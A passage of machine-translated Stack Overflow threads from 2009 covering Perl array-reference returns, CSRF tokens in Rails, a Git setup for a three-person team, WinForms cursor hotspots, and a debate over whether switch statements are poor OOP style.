    return $arr_ref; # should not get here.
}

sub ARRAY::items { return @{ &ARRAY::slice }; } 
```

请记住，这`autobox`需要您实现所有想要的行为。除非您使用[autobox::Core](http://search.cpan.org/perldoc?autobox::Core)`$arr_ref->pop()`否则在您定义之前不起作用`sub ARRAY::pop`

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-02-15T21:58:18.197

我认为您不应该只使用一种或两种方法。但是，您应该为每个模块或一组模块保持一致。

以下是一些值得思考的例子：

```
sub test1{
  my @arr;
  return @arr;
}
sub test2{
  my @arr;
  return @arr if wantarray;
  return \@arr;
}
sub test3{
  my %hash;
  return %hash;
}
sub test4{
  my %hash;
  return %hash if wantarray;
  return \%hash;
}
sub test5{
  my %hash;
  return $hash{ qw'one two three' } if wantarray;
  return \%hash;
}
{
  package test;
  use Devel::Caller qw'called_as_method';
  sub test6{
    my $out;
    if( wantarray ){
      $out = 'list';
    }else{
      $out = 'scalar';
    }
    $out = "call in $out context";
    if( called_as_method ){
      $out = "method $out";
    }else{
      $out = "simple function $out";
    }
    return $out;
  }
} 
```

我可以看到在未来的项目中可能会使用其中的许多，但其中一些是毫无意义的。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-06-25T11:14:24.210

上述答案中的一个重要遗漏：不要返回对私有数据的引用！

例如：

```
package MyClass;

sub new {
  my($class) = @_;
  bless { _things => [] } => $class;
}

sub add_things {
  my $self = shift;
  push @{ $self->{_things} } => @_;
}

sub things {
  my($self) = @_;
  $self->{_things};  # NO!
} 
```

是的，用这种方式实现的 Perl 对象，用户可以直接窥探底层，但不要让用户在不知不觉中误伤自己，*例如*，

```
my $obj = MyClass->new;
$obj->add_things(1 .. 3);

...;

my $things = $obj->things;
my $first = shift @$things; 
```

最好是返回您的私人数据的（可能是深层）副本，如

```
sub things {
  my($self) = @_;
  @{ $self->{_things} };
} 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-02-15T14:05:38.160

我不确定在这种情况下返回引用是否更有效；即 Perl 是否复制子程序返回的数据？

一般来说，如果您的数组完全在子例程中构建，那么返回引用没有明显问题，因为否则数组无论如何都会被丢弃。但是，如果引用在返回之前也被传递到其他地方，您可能有两个相同引用的副本，并且它可能在一个地方被修改，但预计不会在其他地方修改。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2009-02-15T19:05:38.953

当您习惯将代码用作[Mathieu Longtin](https://stackoverflow.com/users/54320/mathieu-longtin) [答案](https://stackoverflow.com/questions/550906/why-should-you-not-return-an-array-ref/550921#550921)中的第一个片段时，您必须编写丑陋的代码作为第二个片段，或者这不是更好的代码：

```
my ($foo,$bar) = @{barbaz()}; 
```

我认为这是返回引用而不是数组时的最大缺点。如果我想返回少量不同种类的值。我习惯于返回数组并直接分配给变量（例如在 Python 中所做的那样）。

```
my ($status, $result) = do_something();
if ($status eq 'OK') {
    ... 
```

如果值的数量更大且种类繁多，我习惯于返回哈希引用（更适合重构）

```
my ($status, $data, $foo, $bar, $baz) =
    @{do_something()}{qw(status data foo bar baz)};
if ($status eq 'OK') {
    ... 
```

如果返回值是同一种类型，则返回数组或数组引用是有争议的，具体取决于数量。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2009-02-16T04:38:12.290

返回一个数组有一些很好的好处：

```
my @foo = get_array(); # Get list and assign to array.
my $foo = get_array(); # Get magnitude of list.
my ($f1, $f2) = get_array(); # Get first two members of list.
my ($f3,$f6) = (get_array())[3,6]; # Get specific members of the list.

sub get_array {
   my @array = 0..9;

   return @array;
} 
```

如果你返回数组引用，你将不得不写几个 sub 来做同样的工作。此外，空数组在布尔上下文中返回 false，但空数组 ref 不会。

```
if ( get_array() ) {
    do_stuff();
} 
```

如果你返回数组引用，那么你必须这样做：

```
if ( @{ get_array_ref() } ) {
    do_stuff();
} 
```

除非 get_array_ref() 未能返回 ref，而是说 undef 值，否则您的程序会停止崩溃。以下其中一项将有所帮助：

```
if ( @{ get_array() || [] } ) {
    do_stuff();
}

if ( eval{ @{get_array()} } ) {
    do_stuff();
} 
```

因此，如果需要速度优势或者如果您需要一个数组引用（也许您希望允许直接操作对象的集合元素——糟糕，但有时它必须发生），请返回一个数组引用。否则，我发现标准数组的好处值得保留。

**更新：** 记住从例程返回的内容并不总是数组或列表，这一点非常重要。您返回的是`return`, 或最后一次操作的结果之后的任何内容。您的返回值将在上下文中进行评估。大多数时候，一切都会好起来的，但有时你会得到意想不到的行为。

```
sub foo {
    return $_[0]..$_[1];
}

my $a = foo(9,20);
my @a = foo(9,20);

print "$a\n";
print "@a\n"; 
```

与之比较：

```
sub foo {
    my @foo = ($_[0]..$_[1]);
    return @foo;
}

my $a = foo(9,20);
my @a = foo(9,20);

print "$a\n";
print "@a\n"; 
```

因此，当您说“返回一个数组”时，请确保您的真正意思是“返回一个数组”。注意你从日常生活中得到的回报。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2009-02-16T04:49:50.360

*有什么理由我不应该这样做，即使是很小的结果？*

没有特定于 perl 的原因，这意味着返回对本地数组的引用是正确且有效的。唯一的缺点是调用您的函数的人必须处理返回的数组 ref，并使用箭头`->`或取消引用等访问元素。因此，调用者会稍微麻烦一些。

# ruby-on-rails - 在 Rails 中，如果您已经在检查用户是否登录，是否需要使用 form_authenticity_token？

> ID：550908
> 
> 赞同：1
> 
> 时间：2009-02-15T13:58:26.150
> 
> 标签：ruby-on-rails, security, authentication, forms-authentication

因为 form_authenticity_token 用于验证请求，当您已经在检查用户是否登录时使用它是否多余？

也就是说，form_authenticity_token 真的只适用于任何人都可以使用的表单，而不是专门为登录用户使用的表单吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-15T17:08:55.070

登录会使 XSRF 攻击变得更糟，因为它实际上可能会损坏真实数据。检查这些作为起点。

[RESTful 应用程序中的 XSRF](https://stackoverflow.com/questions/253327/xsrf-in-a-restful-application)

[跨站点请求伪造和您](http://www.codinghorror.com/blog/archives/001171.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-16T23:44:00.570

不，因为在 CSRF 攻击中，请求是由经过身份验证的客户端浏览器发送的，并且可能会删除他的数据。

阅读[有关 CSRF 的 Ruby on Rails 安全指南部分](http://guides.rails.info/security.html#cross-site-reference-forgery-csrf)。

# git - 为 3 人团队设置 Git？

> ID：550913
> 
> 赞同：15
> 
> 时间：2009-02-15T14:00:58.233
> 
> 标签：git, version-control, gitosis

**该帖子旨在总结所有信息，以在比赛中为 3 人建立一个封闭的存储库。**请随时将我没有注意到的问题添加到列表中。请将每个问题的每个答案添加为单独的答案。

1.  **情况 A：**草稿和文件可以在 3 人之间交换。writer 只能将文件推送到存储库。
2.  **情况B：**同上，但所有队友都可以将文件推送到存储库。

**情况 A 的一般问题**

*   您如何为 A、B 和 C 人设置远程分支，以便团队成员可以看到他们的团队成员想要共享的文件？
*   你如何将 A 人设置为独裁者，只能将更改推送到神圣存储库？

**关于情况 A 的初始问题**

1.  *[你如何建立一个 Git 存储库，让 A、B 和 C 人可以拉取？](https://stackoverflow.com/questions/550913/setting-git-for-a-team-of-3-people/552189#552189)*我假设 Git 已经成功安装到存储库
2.  *你怎么能允许作家只推？*

**关于这两种情况的高级问题**

*   当您没有 sudo 访问权限时，如何通过首先设置 Python 设置工具将[Gitosis 设置](https://stackoverflow.com/questions/550913/setting-git-for-a-team-of-3-people/627470#627470)到[您的服务器？](http://scie.nti.st/2007/11/14/hosting-git-repositories-the-easy-and-secure-way)
*   [如何有效地向队友报告错误？](https://stackoverflow.com/questions/550913/setting-git-for-a-team-of-3-people/901838#901838)

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2009-02-15T15:23:25.930

**情况A**

听起来您想设置一个[集成管理器工作流](http://www.whygitisbetterthanx.com/#any-workflow)。在这种情况下，A 人创建了一个初始存储库，即神圣存储库。每个人，A、B 和 C，为他们的个人工作克隆该存储库。当 B 或 C 有一些他们希望 A 包含在存储库中以供共享的内容时，他们将其提交到本地存储库，并要求 A 从其存储库中拉取（*拉取请求*）；人员 A 为人员 B 和人员 C 的存储库设置*远程*s，然后可以`git pull personB`或`git pull personB`合并更改。然后人 A`git push`将合并的更改放入神圣的存储库中。

您可以设置克隆和推送各种传输。最简单的是通过 ssh 使用 git 协议。例如，

1.  [人 A 制作了神圣的存储库：请参阅此页面上的 37signals](https://37s.backpackit.com/pub/1465067)中的“创建远程存储库” 。假设它在`/local/git/project.git`on `sharedhost`。您可以省略 ，`--shared=group`因为您希望它成为集成存储库。（此处的写访问使用 Unix 文件权限进行保护。）
2.  人员 A、B 和 C 在其主目录中克隆该存储库。

    ```
    cd ~/src
    git clone ssh://sharedhost//local/git/project.git
    cd project # edit files in here.
    git commit 
    ```

3.  人员 A 为 B 和 C 的存储库设置了遥控器。

    ```
    git remote add personB ssh://sharedhost/~b/src/project
    git remote add personC ssh://sharedhost/~c/src/project 
    ```

4.  现在 A 可以`git pull personB`获取 B 的更改。当 A 高兴时，他会将`git push`新合并的更改推送到共享 repo，B 和 C 可以`git pull`获取它们。

如果设置存储库听起来有点复杂，您可能需要付费给[GitHub](http://github.com/plans/)等提供商来为您处理共享 git 存储库的所有托管。他们也有支持，可以帮助您解决问题。对我来说，我发现最棘手的部分是理解提交的流程。一旦你明白了，事情就开始变得更有意义了。gitready.com[上的讨论](http://gitready.com/beginner/2009/01/21/pushing-and-pulling.html)可能有助于为您澄清事情。还有一个涵盖类似材料的[截屏视频。](http://www.gitcasts.com/posts/distributed-workflow)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-16T03:45:55.427

> 1.  你如何建立一个 Git 存储库，让 A、B 和 C 人可以拉取？

您需要使用 ssh -protocol (ssh username@ipAddress)，并通过在托管存储库 ( [Source](https://stackoverflow.com/questions/552121/setting-a-password-for-git-cloning/552148#552148) ) 的机器上为他们提供一个帐户，为 3 个人提供 ssh 访问权限。

我建议为您的团队成员提供 SSH 密钥。请看[帖子](https://stackoverflow.com/questions/591766/can-i-use-ssh-keys-in-something-other-than-putty-on-mac)。这允许他们通过运行来克隆，例如：

```
git clone user@machine:/path/to/repo.git 
```

* * *

**已发展的问题**

> 如何提供 3 个人的帐户？

如果您的文件必须是私密的，我建议您在 Github 上注册一个帐户，费用为几美元。你也可以通过 Gitosis 在你自己的服务器上设置一个 repo。

如果您的文件可以打开，我建议您使用 Github，因为它是免费的。

* * *

**一个更发达的问题**

> 如何将用户添加到 Git 存储库？

您可以通过在 Git 分支上运行以下代码来将用户添加到您的团队

```
git add remote UserName ssh://ADDressToTheRepo 
```

**命令示例**

```
git add remote schacon git://github.com/schacon/ticgit.git 
```

* * *

**一个更发达的问题**

> 如何将你朋友的分支添加到你的 Git 中？

请在[线程](https://stackoverflow.com/questions/904353/unable-to-understand-git-branch-merge-and-rebase/907799#907799)中查看我的答案。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-09T18:26:16.463

有人建议我使用 Gitosis，这引发了一个[新问题](http://scie.nti.st/2007/11/14/hosting-git-repositories-the-easy-and-secure-way)： ***当您没有 sudo 访问权限时，如何通过首先设置 Python-setuptools 将 Gitosis 设置到您的服务器？***

**安装 Gitosis 的解决方案**：请参阅[帖子](https://stackoverflow.com/questions/622744/unable-to-install-python-without-sudo-access/622810#622810)以安装最新的 Python。请注意，您的系统可能有一个旧的 Python。如果不更新整个操作系统，就无法更新系统 Python。例如，您无法更新 Mac Leopard 的 Python，因为系统依赖于它。

现在，您可以开始安装 python-setuptools。请参阅[帖子](https://stackoverflow.com/questions/624671/unable-to-install-python-setuptools-from-source)以安装它们。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-05-23T16:17:22.500

> 如何有效地向队友报告错误？

我在向我的队友报告错误和功能请求时遇到了问题。

软件[TicGit](http://github.com/schacon/ticgit/tree/master)为我解决了这个问题。它是 Git 的票证系统，您只需将其设置为项目的单独分支即可安装。

# c# - 用户活动记录应用程序

> ID：550916
> 
> 赞同：0
> 
> 时间：2009-02-15T14:03:46.323
> 
> 标签：c#

如果我想登录用户活动的数据库（即打开 Internet Explorer（甚至可能是网站？），打开 Visual Studio），我该如何开始。有没有我应该考虑使用的 .Net 类？谢谢。（C#）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-15T14:39:53.493

.net 没有任何帮助类可以直接执行此操作。

老实说，您可能需要使用 C++ 来捕捉很多东西，也许使用防病毒 API 来监视进程调用，并且您必须在 ie 中插入一个插件才能有效地监视它。

# .net - 在 WinForms / .NET 中更改光标热点

> ID：550918
> 
> 赞同：9
> 
> 时间：2009-02-15T14:06:15.647
> 
> 标签：.net, winforms

我在运行时从图像资源创建一个光标。新光标的热点始终设置为 16x16（32x32 图像）。是否可以在运行时更改 HotSpot 或者我需要创建 .cur 文件？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2009-02-15T14:43:27.103

你当然可以。这是我的实用功能，您可以根据需要进行编辑:)

```
 public struct IconInfo
    {
        public bool fIcon;
        public int xHotspot;
        public int yHotspot;
        public IntPtr hbmMask;
        public IntPtr hbmColor;
    }
    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool GetIconInfo(IntPtr hIcon, ref IconInfo pIconInfo);
    [DllImport("user32.dll")]
    public static extern IntPtr CreateIconIndirect(ref IconInfo icon);

    /// <summary>
    /// Create a cursor from a bitmap without resizing and with the specified
    /// hot spot
    /// </summary>
    public static Cursor CreateCursorNoResize(Bitmap bmp, int xHotSpot, int yHotSpot)
    {
        IntPtr ptr = bmp.GetHicon();
        IconInfo tmp = new IconInfo();
        GetIconInfo(ptr, ref tmp);
        tmp.xHotspot = xHotSpot;
        tmp.yHotspot = yHotSpot;
        tmp.fIcon = false;
        ptr = CreateIconIndirect(ref tmp);
        return new Cursor(ptr);
    }

    /// <summary>
    /// Create a 32x32 cursor from a bitmap, with the hot spot in the middle
    /// </summary>
    public static Cursor CreateCursor(Bitmap bmp)
    {
        int xHotSpot = 16;
        int yHotSpot = 16;

        IntPtr ptr = ((Bitmap)ResizeImage(bmp, 32, 32)).GetHicon();
        IconInfo tmp = new IconInfo();
        GetIconInfo(ptr, ref tmp);
        tmp.xHotspot = xHotSpot;
        tmp.yHotspot = yHotSpot;
        tmp.fIcon = false;
        ptr = CreateIconIndirect(ref tmp);
        return new Cursor(ptr);
    } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-08-08T23:02:34.703

由于这是一个 .NET 问题，而不是具体的 C# 问题，这里是 Nick 的部分代码的 VB.NET 转换（为其他人省去麻烦）。

```
Module IconUtility
Structure IconInfo
    Public fIcon As Boolean
    Public xHotspot As Integer
    Public yHotspot As Integer
    Public hbmMask As IntPtr
    Public hbmColor As IntPtr
End Structure

Private Declare Function GetIconInfo Lib "user32.dll" (hIcon As IntPtr, ByRef pIconInfo As IconInfo) As Boolean
Private Declare Function CreateIconIndirect Lib "user32.dll" (ByRef icon As IconInfo) As IntPtr

' Create a cursor from a bitmap without resizing and with the specified hot spot
Public Function CreateCursorNoResize(bmp As System.Drawing.Bitmap, xHotSpot As Integer, yHotSpot As Integer) As Cursor
    Dim ptr As IntPtr = bmp.GetHicon
    Dim tmp As IconInfo = New IconInfo()
    GetIconInfo(ptr, tmp)
    tmp.xHotspot = xHotSpot
    tmp.yHotspot = yHotSpot
    tmp.fIcon = False
    ptr = CreateIconIndirect(tmp)
    Return New Cursor(ptr)
End Function
End Module 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-15T14:44:14.263

看看[MSDN 上的这篇文章](http://social.msdn.microsoft.com/forums/en-US/winforms/thread/9ea0bf74-760f-4f40-b64c-0cf7b0a56939/)。似乎有几个可能的解决方案（使用 P/Invoke），您应该能够复制粘贴和使用它们。

# java - 有没有人不同意以下说法：“使用 switch 是糟糕的 OOP 风格”？

> ID：550919
> 
> 赞同：27
> 
> 时间：2009-02-15T14:06:26.600
> 
> 标签：java, oop, switch-statement

我已经看到它在stackoverflow的多个线程/评论中编写，使用`switch`只是糟糕的OOP风格。我个人不同意这一点。

在很多情况下，您无法将代码（即方法）添加到`enum`要打开的类，因为您无法控制它们，也许它们位于第 3 方 jar 文件中。在其他情况下，将功能*放在 enum 本身*是一个坏主意，因为它违反了一些关注点分离的考虑，或者它实际上是其他东西的函数*以及 enumeration*。

最后，开关简洁明了：

```
boolean investable;
switch (customer.getCategory()) {
    case SUB_PRIME:
    case MID_PRIME:
        investible = customer.getSavingsAccount().getBalance() > 1e6; break;
    case PRIME:
        investible = customer.isCeo(); break;
} 
```

我不是为每一种使用辩护`switch`，我也不是说它总是要走的路。但在我看来，像“Switch 是一种代码味道”这样的说法是错误的。还有人同意吗？

* * *

## 回答 #1

> 赞同：57
> 
> 时间：2009-02-15T16:06:36.733

我认为这样的陈述

> 使用 switch 语句是不好的 OOP 风格。

和

> 案例语句几乎总是可以用多态性代替。

过于简单化了。**事实是，打开类型**的case 语句是糟糕的 OOP 风格。这些是您想要用多态性替换的那些。打开一个**值**很好。

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2009-02-15T16:01:16.247

采取后续行动：

> *如果这只是希望获得商业贷款的客户的“可投资性”逻辑怎么办？也许客户对另一种产品的可投资性决定真的很不同......另外，如果一直有新产品出现，每个产品都有不同的可投资性决定，我不想每次都更新我的核心客户类这种情况发生的时间？*

和你的评论之一：

> *我不完全确定是否将逻辑靠近它所操作的数据。现实世界不是这样运作的。当我申请贷款时，银行会决定我是否符合条件。他们不要求我自己做决定。*

就这一点而言，你是对的。

```
boolean investable = customer.isInvestable(); 
```

不是您所说的灵活性的最佳解决方案。但是，原始问题没有提到存在单独的 Product 基类。

鉴于现在可用的附加信息，最好的解决方案似乎是

```
boolean investable = product.isInvestable(customer); 
```

可投资性决策由产品根据您的“真实世界”论点做出（多态性！），并且它还避免了每次添加产品时都必须创建新的客户子类。产品可以根据客户的公共接口使用它想要做出该决定的任何方法。我仍然会质疑是否可以对客户界面进行适当的添加以消除切换的需要，但它可能仍然是所有弊端中最小的。

但是，在提供的特定示例中，我很想这样做：

```
if (customer.getCategory() < PRIME) {
    investable = customer.getSavingsAccount().getBalance() > 1e6;
} else {
    investable = customer.isCeo();
} 
```

我发现这比在 switch 中列出所有可能的类别更清晰、更清晰，我怀疑它更有可能反映“现实世界”的思维过程（“它们是否低于质数？”与“它们是次质数还是中质数” ?")，并且如果在某些时候添加了 SUPER_PRIME 名称，它就不必重新访问此代码。

* * *

## 回答 #3

> 赞同：16
> 
> 时间：2009-02-15T15:05:32.540

在纯 OO 代码中使用时，开关是一种代码味道。这并不意味着它们在定义上是错误的，只是你需要三思而后行。要格外小心。

我在这里对 switch 的定义还包括 if-then-else 语句，这些语句可以很容易地重写为 switch 语句。

开关可能表明您没有定义接近其操作的数据的行为，并且没有利用例如子类型多态性。

使用 OO 语言时，您不会被迫以 OO 方式进行编程。因此，如果您选择使用更具功能性或基于对象的编程风格（例如，使用仅包含数据但不包含行为的 DTO，而不是更丰富的域模型），使用开关没有任何问题。

最后，在编写 OO 程序时，开关在您的 OO 模型的“边缘”非常方便，当某些东西从非 OO 外部世界进入您的 OO 模型并且您需要将此外部实体转换为 OO 概念时。你最好尽早这样做。例如：数据库中的 int 可以使用开关转换为对象。

```
int dbValue = ...;

switch (dbValue)
{
  case 0: return new DogBehaviour();
  case 1: return new CatBehaviour();
  ...
  default: throw new IllegalArgumentException("cannot convert into behaviour:" + dbValue);  
} 
```

**阅读一些回复后进行**编辑。****

 **`Customer.isInvestable`: 很好，多态。但是现在您将此逻辑与客户联系起来，您需要为每种类型的客户创建一个子类，以实现不同的行为。上次我检查时，这不是应该使用继承的方式。您可能希望客户类型是 的属性`Customer`，或者具有可以决定客户类型的函数。

双分派：多态两次。但是你的访问者类本质上仍然是一个很大的转变，它有一些与上面解释的相同的问题。

此外，按照 OP 的示例，多态性应该在客户的类别上，而不是在`Customer`其自身上。

切换一个值很好：好的，但是 switch 语句在大多数情况下用于测试单个`int`, `char`, `enum`, ... 值，而不是 if-then-else 可以测试范围和更奇特的条件。但是如果我们在这个单一的值上进行调度，并且它不像上面解释的那样位于我们的 OO 模型的边缘，那么似乎开关经常被用来在类型上调度，而不是在一个值上。或者：如果你*不能*用 switch 替换 if-then-else 的条件逻辑，那么你可能没问题，否则你可能不行。因此，我认为 OOP 中的开关是代码异味，而声明

> 打开类型是不好的 OOP 风格，打开一个值就可以了。

本身就过于简单化了。

回到起点：a`switch`还不错，只是并不总是非常 OO。您不必使用 OO 来解决您的问题。如果您确实使用 OOP，那么您需要特别注意开关。

* * *

## 回答 #4

> 赞同：14
> 
> 时间：2009-02-15T14:09:32.880

这是糟糕的 OOP 风格。

并不是所有的问题都最好用 OO 来解决。有些你想要模式匹配，哪个开关是穷人的版本。

* * *

## 回答 #5

> 赞同：12
> 
> 时间：2009-02-15T15:32:46.393

如果有的话，我受够了人们描述这种编程风格——其中一堆getter被添加到“低挂”类型（客户、账户、银行）中，有用的代码被喷洒在“控制器”中的系统周围"、"helpers" 和 "utility" 类——作为面向对象的。像这样的代码在 OO 系统中*是*一种气味，你应该问*为什么*而不是被冒犯。

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2009-02-15T16:10:41.310

当然开关是糟糕的 OO，你不应该在函数中间放一个 return，魔术值是不好的，引用永远不应该是 null，条件语句必须放在 {braces} 中，但这些是指导方针。他们不应该被虔诚地追随。可维护性、可重构性和可理解性都非常重要，但都仅次于实际完成工作。有时我们没有时间成为一个编程理想主义者。

如果任何程序员被认为是有能力的，那么应该假设他可以遵循指导方针并**谨慎**使用可用的工具，并且应该接受他不会总是做出最好的决定。他可能会选择一条不太理想的路线，或者犯错误并遇到难以调试的问题，因为他选择了一个开关，而他可能不应该拥有或传递太多的空指针。这就是生活，他从错误中吸取教训，因为他有能力。

我不虔诚地遵循编程教条。我在自己作为程序员的背景下考虑指导方针，并以合理的方式应用它们。除非它们是手头问题的基础，否则我们不应该对这些类型的编程实践大加赞赏。如果您想就良好的编程实践发表意见，最好在博客或适当的论坛（例如此处）中进行。

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2009-02-16T14:00:23.080

罗伯特马丁关于[开放封闭原则](http://www.objectmentor.com/resources/articles/ocp.pdf)的文章提供了另一种观点：

> 软件实体（类、模块、功能等）应该对扩展开放，但对修改关闭。

在您的代码示例中，您有效地打开了客户“类别类型”

```
boolean investible ;
switch (customer.getCategory()) {
    case SUB_PRIME:
    case MID_PRIME:
        investible = customer.getSavingsAccount().getBalance() > 1e6; break;
    case PRIME:
        investible = customer.isCeo(); break;
} 
```

在当前的环境下，新的客户类别可能会如雨后春笋般涌现；-)。这意味着必须打开这个类，并不断地修改它。如果你只有一个 switch 语句可能没问题，但是如果你想在其他地方使用类似的逻辑会发生什么。

与其他建议不同，在 where`isInvestible`上创建一个方法`Customer`，我会说 Cgtegory 应该成为一个成熟的类，并用于做出这些决定：

```
boolean investible ;
CustomerCategory category = customer.getCategory();
investible = category.isInvestible(customer);

class PrimeCustomerCategory extends CustomerCategory {
    public boolean isInvestible(Customer customer) {
        return customer.isCeo();
    }
} 
```

* * *

## 回答 #8

> 赞同：5
> 
> 时间：2009-02-15T15:30:11.593

在某些情况下，您需要根据多个选项做出决定，而多态性是多余的（YAGNI）。在这种情况下，开关很好。Switch 只是一个工具，可以像任何其他工具一样轻松使用或滥用。

这取决于你想要做什么。然而，关键是你在使用 switch 时应该三思而后行，因为它*可能*表明设计不好。

* * *

## 回答 #9

> 赞同：5
> 
> 时间：2009-02-15T17:12:48.070

我确实相信打开类型是一种代码味道。但是，我分享您对代码中关注点分离的担忧。但是这些可以通过多种方式解决，允许您仍然使用多态性，例如**访问者模式**或类似的东西。阅读四人组的**“设计模式” 。**

如果您的核心对象（如*Customer*）大部分时间保持不变，但操作经常更改，那么您可以将操作定义为对象。

```
 interface Operation {
      void handlePrimeCustomer(PrimeCustomer customer);
      void  handleMidPrimeCustomer(MidPrimeCustomer customer);
      void  handleSubPrimeCustomer(SubPrimeCustomer customer);    
    };

    class InvestibleOperation : public Operation {
      void  handlePrimeCustomer(PrimeCustomer customer) {
        bool investible = customer.isCeo();
      }

      void  handleMidPrimeCustomer(MidPrimeCustomer customer) {
        handleSubPrimeCustomer(customer);
      }

      void  handleSubPrimeCustomer(SubPrimeCustomer customer) {
        bool investible = customer.getSavingsAccount().getBalance() > 1e6;    
      }
    };

    class SubPrimeCustomer : public Customer {
      void  doOperation(Operation op) {
        op.handleSubPrimeCustomer(this);
      }
    };

   class PrimeCustomer : public Customer {
      void  doOperation(Operation op) {
        op.handlePrimeCustomer(this);
      }
    }; 
```

这看起来有点矫枉过正，但是当您需要将操作作为集合处理时，它可以轻松地为您节省大量编码。例如，将它们全部显示在列表中并让用户选择一个。如果操作被定义为函数，那么您很容易以大量硬编码的 switch-case 逻辑结束，每次添加另一个操作时都需要更新多个位置，或者我在这里看到的*产品。*

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2009-02-15T16:15:08.037

我将 switch 语句视为 if/else 块的更易读的替代方案。

我发现，如果您可以将逻辑归结为可以整体评估的结构，那么代码很可能会提供 OOP 所需的封装级别。

在某些时候，必须编写真实（杂乱）逻辑才能发布实用程序。Java 和 C# 不是严格的 OOP 语言，因为它们继承自 C。如果您想严格执行 OOP 代码，那么您需要使用一种不提供违反这种思维方式的习语的语言。我的观点是 Java 和 C# 都旨在灵活。

奇怪的是，VB6 如此成功的原因之一是它是基于对象的，而不是面向对象的。所以，我会说务实的程序员总是会结合概念。Switch 还可以导致更易于管理的代码，只要已经编写了合适的封装。

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2009-02-15T14:10:39.380

在你的库周围工作也是一种代码味道。您可能别无选择，但这并不是一个好的做法。

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2009-02-15T15:03:52.827

我发现在 OO 代码中使用 switch 语句没有任何问题。我唯一的批评是我会在 Customer 上创建一个名为 IsInvestible 的新方法，它隐藏了这个逻辑。使用 switch 语句作为该方法的内部实现有 0 个错误。正如您所说，您不能向枚举添加方法，但可以向客户添加更多方法。

如果您无法访问源代码，我会说非实例方法很好。最纯粹的 OOP 需要一个全新的对象，但在这种情况下，这似乎有点矫枉过正。

* * *

## 回答 #13

> 赞同：2
> 
> 时间：2009-02-15T15:20:43.097

Î 知道你来自哪里。有些语言会强迫你这样做。

```
String str = getStr();
switch(str) {
case "POST" : this.doPost(); break;
case "GET" : this.doGet(); break;
//and the other http instructions
} 
```

现在呢？当然，有一个很好的 OOP 方法可以做到这一点：

```
str.request(this); 
```

太糟糕了，String 无法扩展，现在您正在考虑为每个 HttpInstruction 编写一个包含 8 个子类的 HttpInstruction 类。老实说，尤其是在谈论解析器时，这非常困难。

当然，这不是好的 OOP，但好的代码并不总是……可能。

让我暂时离题。我正在写我的论文。我个人不喜欢递归函数的通常设置。你通常有 funcRec(arg1,arg) 和 func(arg1):=func(funcRec(arg1,0));

所以我在我的论文中用默认参数定义了它。不是每个人都知道默认参数的概念。我的论文使用伪代码，但是教授让我将算法更改为传统方式，因为您不会经常遇到默认参数，所以不要使用它们。不要不必要地让你的读者感到惊讶。我认为他是对的。

但结果是现在我被一个函数困住了，它的唯一目的是传递默认参数——这可能更漂亮。

所以，底线是：真正漂亮的程序需要优秀的库、优秀的代码浏览器和工具、FogBugz 质量的错误跟踪器，至少更好、更集成、git 质量的版本管理等等。而且，嗯，你周围的人可以使用所有这些东西并且知道如何处理所有这些东西。最重要的是：一种漂亮的语言，可以优雅地解决棘手的问题。

因此，您很可能会被 Java 困住，这使得在所有情况下都很难找到一个好的开关替代品。Self 会有一个优雅的解决方案。但是您没有使用 Self，如果您使用了，您的同事将无法阅读它，所以忘记这一点。

现在找到妥协。

很难过，我知道。

* * *

## 回答 #14

> 赞同：2
> 
> 时间：2009-02-16T01:21:26.447

我认为 switch 语句是否是糟糕的 OOP 实践取决于你在哪里使用 switch 语句。

例如，在工厂方法中，它可能是编写复杂且可能存在错误的基于反射的代码的一种非常简单的替代方法。

但在大多数情况下，我认为开关只是简单的设计。经常使用相同的方法将操作复杂性隐藏在不同的对象中会导致代码更易于理解，甚至可能更快。例如，如果你有一个执行**很多**的开关，那么预先打包的对象实际上可以节省一些 CPU 周期。

* * *

## 回答 #15

> 赞同：2
> 
> 时间：2009-02-16T01:34:04.823

由于您没有引入代码，因此来自外部来源的数据本质上不能真正面向对象。如果它包含案例，您将有案例。时期。

除此之外，OOP 并不是灵丹妙药。有时是答案，有时不是。

* * *

## 回答 #16

> 赞同：1
> 
> 时间：2009-02-15T14:35:00.883

是的，我受够了人们告诉你这是不好的风格。

编辑：在问题得到解决之前，这更有意义。

* * *

## 回答 #17

> 赞同：1
> 
> 时间：2009-02-15T15:02:54.200

案例语句几乎总是可以用多态性代替。

```
public class NormalCustomer extends Customer {
    public boolean isInvestible() {
        return getSavingsAccount().getBalance() > 1e6;
    }
}

public class PreferredCustomer extends Customer {
    public boolean isInvestible() {
        return isCeo();
    }
} 
```

这种方法将简化客户端代码。客户端代码不必知道如何计算“可投资性”的细节，也不再需要通过挖掘客户对象的状态 来打破得[墨忒耳定律。](http://en.wikipedia.org/wiki/Law_of_Demeter)

* * *

## 回答 #18

> 赞同：1
> 
> 时间：2009-02-15T15:26:26.267

> 现在呢？当然，有一个很好的 OOP 方法可以做到这一点：
> 
> str.request(this);
> 
> 太糟糕了，String 无法扩展，现在您正在考虑为每个 HttpInstruction 编写一个包含 8 个子类的 HttpInstruction 类。老实说，尤其是在谈论解析器时，这非常困难。

曾经尝试过 C# 扩展方法吗？字符串可以扩展。

* * *

## 回答 #19

> 赞同：1
> 
> 时间：2009-02-16T01:33:42.953

我对 switch 语句的问题是，在现实世界的应用程序中，很少有独立存在的 switch 语句。

